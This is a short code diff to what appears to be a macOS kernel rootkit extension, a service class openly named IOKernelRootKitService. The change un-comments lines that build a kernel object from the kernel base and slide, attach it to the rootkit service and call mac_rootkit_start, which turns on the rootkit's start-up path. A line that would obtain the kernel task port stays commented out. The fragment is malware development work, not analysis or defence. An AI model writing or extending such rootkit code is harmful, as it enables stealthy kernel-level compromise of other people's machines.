@@ -53,13 +53,13 @@ bool IOKernelRootKitService::start(IOService *provider)
 
 	MAC_RK_LOG("MacRK::@ kernel base = %s\n", buffer);
 
-	// this->kernel = new Kernel(kernel_base, kernel_slide);
+	this->kernel = new Kernel(kernel_base, kernel_slide);
 
-	// this->kernel->setRootKitService(this);
+	this->kernel->setRootKitService(this);
 
 	// this->tfp0 = this->kernel->getKernelTaskPort();
 
-	// ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
+	ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
 
 	if(ret == kIOReturnSuccess)
 	{
